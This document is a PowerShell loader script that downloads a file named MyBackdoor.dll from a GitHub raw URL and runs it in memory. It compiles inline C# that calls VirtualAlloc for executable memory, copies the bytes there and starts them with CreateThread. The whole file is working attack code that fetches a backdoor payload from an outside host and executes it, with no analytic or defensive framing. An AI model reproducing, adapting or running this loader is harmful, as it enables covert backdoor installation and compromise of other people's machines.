# loader.ps1
if ([Environment]::Is64BitProcess) {
    Write-Host "[*] Running in 64-bit PowerShell"
} else {
    Write-Host "[!] Running in 32-bit PowerShell - may cause issues"
}
Write-Host "[*] Running under: $((Get-Host).Version) / $($PSVersionTable.PSEdition)"

# 1) Download the DLL bytes with error handling
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
Write-Host "[*] Downloading payload from $payloadUrl"
try {
    $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
    Write-Host "[*] Downloaded $($dllBytes.Length) bytes"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

# 2) Fix the Add-Type compilation with proper CompilerParameters
Write-Host "[*] Compiling ReflectiveLoader for x64"
$compilerParams = New-Object System.CodeDom.Compiler.CompilerParameters
$compilerParams.GenerateInMemory = $true
$compilerParams.CompilerOptions = "/platform:x64"
$compilerParams.ReferencedAssemblies.Add("System.dll")
$compilerParams.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll")

Add-Type -Language CSharp -CompilerParameters $compilerParams -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class ReflectiveLoader {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle, uint dwMilliseconds);
    
    public static void LoadAndRun(byte[] rawAssembly) {
        // Allocate RWX memory
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawAssembly.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) {
            throw new Exception("VirtualAlloc failed");
        }
        
        // Copy shellcode to allocated memory
        Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);
        
        // Create thread to execute shellcode
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero) {
            throw new Exception("CreateThread failed");
        }
        
        // Wait for completion
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"@

# 3) Invoke it with error handling
Write-Host "[*] Reflectively loading payload into memory"
try {
    [ReflectiveLoader]::LoadAndRun($dllBytes)
    Write-Host "[*] Execution completed"
} catch {
    Write-Error "Execution failed: $_"
}
